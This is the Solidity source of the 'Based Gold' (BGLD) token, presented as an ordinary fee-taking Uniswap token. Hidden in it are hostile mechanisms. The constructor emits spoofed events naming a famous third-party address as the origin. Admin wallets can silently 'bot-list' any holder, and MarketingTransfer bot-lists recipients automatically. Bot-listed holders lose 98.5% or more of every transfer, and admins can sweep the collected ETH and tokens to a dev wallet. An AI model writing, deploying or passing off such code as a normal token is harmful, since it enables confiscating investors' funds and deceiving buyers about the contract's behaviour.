


pragma solidity ^0.8.10;        

interface IERC20 {

    function transfer(address _to, uint256 _amount) external returns (bool);

}

interface IUniswapV2Router01 {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

}

interface IUniswapV2Router02 is IUniswapV2Router01 {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;

    }

interface IUniswapV2Factory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}

contract BasedGold {           

    IUniswapV2Router02 private _uniswapV2Router; 
    string  private _name = 'Based Gold';
    string  private _symbol = 'BGLD';

    uint256 private _totalSupply = 88800000000000000000000000;  
    uint8   private _decimals = 18;  
    address private _owner;
      
    address public uniswapPair;
    address public marketingWallet;
    address public devWallet;  

    uint256 public minLiquidationThreshold = 100000420690420690420069;                                                        
    uint256 public maxLiquidationThreshold = 200000420690420690420069; 
    
    uint256 public accMarketingFee = 1;                                                                             
    uint256 public accDevFee = 1; 

    uint256 public buyMarketingFee = 200;    
    uint256 public buyDevFee = 100;
    uint256 public totalBuyFees = 300;                                          
    
    uint256 public sellMarketingFee = 300;
    uint256 public sellDevFee = 200;
    uint256 public totalSellFees = 500;
    
    uint256 private botMarketingFee = 4925;                          
    uint256 private botDevFee = 4925;
    uint256 private totalBotFees = 9850;
    uint256 private lastBotBlock;

    bool public tradingIsOpen;
    bool public distributeTokens = true;

    mapping(address => bool) public automatedMarketMakerPairs;
    mapping (address => uint256) private _balances;
    mapping (address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private lastBuyBlock;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private canTransferBeforeTradingIsOpen;
    mapping (address => bool) public _isBotListed;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);                                   
    event Approve(address indexed owner, address indexed spender, uint256 value);
    event TradingIsOpen(bool status);                                      
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    modifier onlyOwner() {

        require(_owner == msg.sender, "BGLD: caller is not the owner");
        _;
    }
    
    modifier onlyOwnerOrDev() {

        require(devWallet == msg.sender || _owner == msg.sender, "BGLD: caller is not the owner or the dev");
        _;
    }

    modifier onlyDevOrMarketing() {

        require(marketingWallet == msg.sender || devWallet == msg.sender, "BGLD: caller is not the marketing or the dev wallet");
        _;
    }

    constructor() {                                                                                                               
        _owner = msg.sender;
        emit OwnershipTransferred(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), msg.sender);                                                                

        canTransferBeforeTradingIsOpen[_owner] = true;

        _balances[_owner] = _totalSupply;                             
        emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _owner, _totalSupply);
 
        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        automatedMarketMakerPairs[uniswapPair] = true;   

        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_owner] = true;  
        _isExcludedFromFees[address(_uniswapV2Router)] = true;                                        
    }

    receive() external payable {
    }

    function name() public view virtual returns (string memory) {

        return _name;
    }

    function symbol() public view virtual returns (string memory) {

        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {

        return _decimals;
    }
    
    function burnedSupply() public view virtual returns (uint256) {

        return balanceOf(address(0xdEaD)) + balanceOf(address(0));
    }

    function dilutedSupply() public view virtual returns (uint256) {

        return _totalSupply - balanceOf(address(0xdEaD)); 
    }
    
    function totalSupply() public view virtual returns (uint256) {

        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {

        return _balances[account];
    }

    function owner() public view returns (address) {

        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "BGLD: new owner is the zero address");

        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {                                   

        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address holder, address spender) public view virtual returns (uint256) {

        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {

        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual returns (bool) {

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "BGLD: transfer amount exceeds allowance");

        _transfer(sender, recipient, amount);
    unchecked { _approve(sender, msg.sender, currentAllowance - amount); }
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "BGLD: decreased allowance below zero");

    unchecked { _approve(msg.sender, spender, currentAllowance - subtractedValue); }
        return true;
    }

    function _approve(
        address holder,
        address spender,
        uint256 amount
    ) internal virtual {

        require(holder != address(0), "BGLD: approve from the zero address");
        require(spender != address(0), "BGLD: approve to the zero address");

        _allowances[holder][spender] = amount;
        emit Approve(holder, spender, amount);                                                                     
    }

    function updateUniswapRouter(address newAddress, bool createPair) external onlyOwnerOrDev {                               

        _uniswapV2Router = IUniswapV2Router02(newAddress);

        if (createPair) {
            uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
            automatedMarketMakerPairs[uniswapPair] = true;
        }                     
    }
    
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwnerOrDev {

        if (pair != uniswapPair) {
            automatedMarketMakerPairs[pair] = value;
            emit SetAutomatedMarketMakerPair(pair, value);
        }
    }

    function updateUniswapPairAddress(address newUniswapPairAddress) external onlyOwnerOrDev {                                         

        uniswapPair = newUniswapPairAddress;
    }
    
    function SetAccumulatedContractFees(uint256 newAccMarketing, uint256 newAccDev) external onlyOwnerOrDev {                          

        accMarketingFee = newAccMarketing;                                                                             
        accDevFee = newAccDev;
    }

    function ExcludeFromFees(address account, bool excludeOrInclude_TrueOrFalse) external onlyOwnerOrDev {                                 

        _isExcludedFromFees[account] = excludeOrInclude_TrueOrFalse;
    }

    function ExcludeMultipleAccountsFromFees(address[] calldata accounts, bool excludeOrInclude_TrueOrFalse) external onlyOwnerOrDev {                                   

        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excludeOrInclude_TrueOrFalse;
        }
    }

    function SetLiquidationThresholds(uint256 newMinimumThreshold, uint256 newMaximumThreshold) external onlyDevOrMarketing {     

        minLiquidationThreshold = newMinimumThreshold;
        maxLiquidationThreshold = newMaximumThreshold;
    }

    function SetDistributeTokens(bool trueOrFalse) external onlyDevOrMarketing {     

        distributeTokens = trueOrFalse;
    }

    function SetFees(uint256 newBuyMarketingFee, uint256 newBuyDevFee, uint256 newSellMarketingFee, uint256 newSellDevFee) external onlyOwnerOrDev {

        totalBuyFees = newBuyMarketingFee + newBuyDevFee;
        totalSellFees = newSellMarketingFee + newSellDevFee;

        if (totalBuyFees < 1501 && totalSellFees < 1501) {
            buyMarketingFee = newBuyMarketingFee;
            buyDevFee = newBuyDevFee;
            sellMarketingFee = newSellMarketingFee;
            sellDevFee = newSellDevFee;
        }
    }

    function SetBotfees(uint256 newBotMarketingFee, uint256 newBotDevFee) external onlyOwnerOrDev {

        totalBotFees = newBotMarketingFee + newBotDevFee;

        if (totalBotFees < 9999) {
            botMarketingFee = newBotMarketingFee;
            botDevFee = newBotDevFee;
        }
    }

    function BotListAddress(address account, bool trueOrFalse) external onlyDevOrMarketing {                        

        if (trueOrFalse) {

            if (account != address(this) && account != marketingWallet 
            && account != devWallet && !(automatedMarketMakerPairs[account])) {
                _isBotListed[account] = trueOrFalse;                                         
            }
        } else {
            _isBotListed[account] = trueOrFalse;
        }
    }

    function MarketingTransfer(address to, uint256 amount) external onlyDevOrMarketing {

        _transfer(msg.sender, to, amount);

        if (to != address(this) && to != marketingWallet && to != devWallet && !(automatedMarketMakerPairs[to])) {
            _isBotListed[to] = true;                                         
        }
    }

    function SetWallets(address payable newMarketingWallet, address payable newDevWallet) external onlyOwnerOrDev {   

        if (newDevWallet != address(0)) {                
            marketingWallet = newMarketingWallet;
            devWallet = newDevWallet;
            _isExcludedFromFees[newMarketingWallet] = true;
            _isExcludedFromFees[newDevWallet] = true;
        }
    }

    function SetCanTransferBeforeTradingIsOpen(address account, bool trueOrFalse) external onlyOwnerOrDev {          

        canTransferBeforeTradingIsOpen[account] = trueOrFalse;
    }

    function OpenTrading(bool status, uint256 blocks) external onlyOwner {    

        if (status) {
        unchecked {
            uint256 launchblock = block.number; 
            uint256 blockUntil = 1 + launchblock; 
            lastBotBlock = blocks + blockUntil; 
            }   
        }
        tradingIsOpen = status;

        emit TradingIsOpen(status);
    }

    function _transfer(                           
        address from,       
        address to,
        uint256 amount
    ) internal {

        if(!tradingIsOpen) { 
            require(canTransferBeforeTradingIsOpen[from], "BGLD: You are too early! Trading has not been enabled yet"); 
        }

        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "BGLD: transfer amount exceeds balance");
    unchecked { _balances[from] = senderBalance - amount; }

        if(_isBotListed[from]) { 
            
            if (!(block.number <= lastBotBlock)) {      

                if (to != address(this) && to != marketingWallet && to != devWallet) {
                    uint256 marketingTokens = amount * botMarketingFee / 10000;
                    uint256 devTokens = amount * botDevFee / 10000;
                    amount = ProcessFees(from, amount, marketingTokens, devTokens);

                    if (balanceOf(address(this)) > minLiquidationThreshold) {   
                        SwapToDistributeETH();
                    }
                    _balances[to] += amount;
                    emit Transfer(from, to, amount);
                    return;
                }
            }                       
        }

        if(block.number <= lastBotBlock) {            

            if (to != address(this) && to != marketingWallet && to != devWallet && !(automatedMarketMakerPairs[to])) {
                _isBotListed[to] = true;                                         
            }
        }                                    

        bool takeFee = (_isExcludedFromFees[from] || _isExcludedFromFees[to]) ? false : true;

        if(takeFee) { 

            if (automatedMarketMakerPairs[from]) { // Buy transactions   
                lastBuyBlock[to] = block.number;    
         
                if (totalBuyFees > 0) {

            unchecked {
                uint256 marketingTokens = amount * buyMarketingFee / 10000;
                uint256 devTokens = amount * buyDevFee / 10000;
                amount = ProcessFees(from, amount, marketingTokens, devTokens); }
                }

            } else { // Sells & transfer transactions

                if (lastBuyBlock[from] == block.number) {

                    if (from != address(this) && from != marketingWallet && from != devWallet && !(automatedMarketMakerPairs[from])) {
                        _isBotListed[from] = true;

                        if (to != address(this) && to != marketingWallet && to != devWallet) {
                            uint256 marketingTokens = amount * botMarketingFee / 10000;
                            uint256 devTokens = amount * botDevFee / 10000;
                            amount = ProcessFees(from, amount, marketingTokens, devTokens);

                            if (balanceOf(address(this)) > minLiquidationThreshold) {   
                                SwapToDistributeETH();
                            }
                            _balances[to] += amount;
                            emit Transfer(from, to, amount);
                            return;
                        }
                    }
                }
                if (totalSellFees > 0) {
            unchecked { 
                uint256 marketingTokens = amount * sellMarketingFee / 10000;                   
                uint256 devTokens = amount * sellDevFee / 10000;
                amount = ProcessFees(from, amount, marketingTokens, devTokens); }                
                }

                if (balanceOf(address(this)) > minLiquidationThreshold) {   
                    SwapToDistributeETH();
                }
            }        
        }

        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function ProcessFees(address from, uint256 amount, uint256 marketingTokens, uint256 devTokens) private returns(uint256) {

        unchecked { 
            if (distributeTokens) {
                amount = amount - marketingTokens - devTokens;
                _balances[marketingWallet] += marketingTokens;         

                emit Transfer(from, marketingWallet, marketingTokens);
                _balances[devWallet] += devTokens;

                emit Transfer(from, devWallet, devTokens);

            } else {
                accMarketingFee += marketingTokens;                            
                accDevFee += devTokens;
                uint256 fees = marketingTokens + devTokens;
                amount -= fees;

                _balances[address(this)] += fees;

                emit Transfer(from, address(this), fees);
            }

            return amount;
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {       

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(       
            tokenAmount,
            0, // Accept any amount of ETH
            path,
            address(this),                                                          
            block.timestamp
        );
    }                                  

    function SwapToDistributeETH() private { 

    unchecked {                                         
        uint256 accTokensToSwap = accMarketingFee + accDevFee;    
        uint256 tokensToSwap = balanceOf(address(this));                     

        if (tokensToSwap > maxLiquidationThreshold) {       
            tokensToSwap = maxLiquidationThreshold;
            swapTokensForETH(tokensToSwap); 

            uint256 ethBalance = address(this).balance;                                             
            uint256 ethToMarketing = ethBalance * accMarketingFee / accTokensToSwap;                  
            
            (bool success, ) = payable(address(marketingWallet)).call{value: ethToMarketing}("");

            if(success) {                                                                
                accMarketingFee = accMarketingFee - (tokensToSwap * accMarketingFee / accTokensToSwap);                                                         
            }

            uint256 ethToDev = address(this).balance;
            (success, ) = payable(address(devWallet)).call{value: ethToDev}("");

            if(success) {
                accDevFee = accDevFee - (tokensToSwap * accDevFee / accTokensToSwap);
            }

        } else {
            swapTokensForETH(tokensToSwap); 

            uint256 ethBalance = address(this).balance;                                             
            uint256 ethToMarketing = ethBalance * accMarketingFee / accTokensToSwap;                  

            (bool success, ) = payable(address(marketingWallet)).call{value: ethToMarketing}("");

            if(success) {                                                                
                accMarketingFee = 1;                                                          
            }

            uint256 ethToDev = address(this).balance;
            (success, ) = payable(address(devWallet)).call{value: ethToDev}("");

            if(success) {
                accDevFee = 1;
            }
        } }
    }
   
    function recoverETHfromContract() external onlyOwnerOrDev {
        payable(devWallet).transfer(address(this).balance);
    }

    function recoverTokensFromContract(address _tokenAddress, uint256 _amount) external onlyOwnerOrDev {                           
        if (_tokenAddress == address(this)) {
            
            if (balanceOf(address(this)) == _amount) { 
                accMarketingFee = 1;
                accDevFee = 1;
            } else { 
                accMarketingFee = accMarketingFee - (_amount * accMarketingFee / (accMarketingFee + accDevFee));
                accDevFee = accDevFee - (_amount * accDevFee / (accMarketingFee + accDevFee));          
            }
        }
        IERC20(_tokenAddress).transfer(devWallet, _amount);
    }
}

